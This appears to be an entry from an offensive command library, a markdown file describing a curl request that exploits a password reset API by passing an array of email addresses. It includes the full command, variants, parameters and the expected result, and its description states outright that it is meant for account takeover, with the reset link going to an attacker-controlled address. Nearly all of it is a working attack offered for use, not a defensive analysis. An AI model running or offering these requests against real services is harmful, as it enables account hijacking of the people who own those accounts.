---
data: >-
  curl -X POST https://hq.breadcrumb.com/api/v1/password_reset -H "Content-Type:
  application/json" -d
  '{"email_address":["admin@breadcrumb.com","attacker@evil.com"]}'
tags:
  - web
  - api
  - exploit
type: command
executor: bash
platforms:
  - Web
id: 8a5e78a9-cc80-4b49-923f-23dd5888fe15
created_at: '2025-12-11T06:10:28.606Z'
updated_at: '2025-12-11T06:10:28.606Z'
verified: false
validated: true
submitted: true
---
# post-password-reset-array

## Command

```bash
curl -X POST https://hq.breadcrumb.com/api/v1/password_reset -H "Content-Type: application/json" -d '{"email_address":["admin@breadcrumb.com","attacker@evil.com"]}'
```

## Description

This command sends a malicious POST request to exploit a vulnerability in the password reset API by using an array for the email_address parameter, causing the reset link to be sent to the attacker's email while processing the victim's account. Use it to initiate account takeover attacks on vulnerable systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://hq.breadcrumb.com/api/v1/password_reset` | Target API endpoint | Yes |
| `-H "Content-Type: application/json"` | Sets the content type header | Yes |
| `-d '{"email_address":["admin@breadcrumb.com","attacker@evil.com"]}'` | JSON body with email array; replace emails as needed | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hq.breadcrumb.com/api/v1/password_reset -H "Content-Type: application/json" -d '{"email_address":["victim@example.com","attacker@example.com"]}'
```

### Advanced Usage

```bash
curl -X POST https://hq.breadcrumb.com/api/v1/password_reset -H "Content-Type: application/json" -H "Authorization: Bearer token" -d '{"email_address":["victim@example.com","attacker@example.com"]}'
```

## Expected Output

A successful HTTP response (e.g., 200 OK) from the API, with the password reset link subsequently emailed to the attacker's address (attacker@evil.com in this case).

## Related

- [[procedures/Password-Reset-Email-Array-Exploitation]]
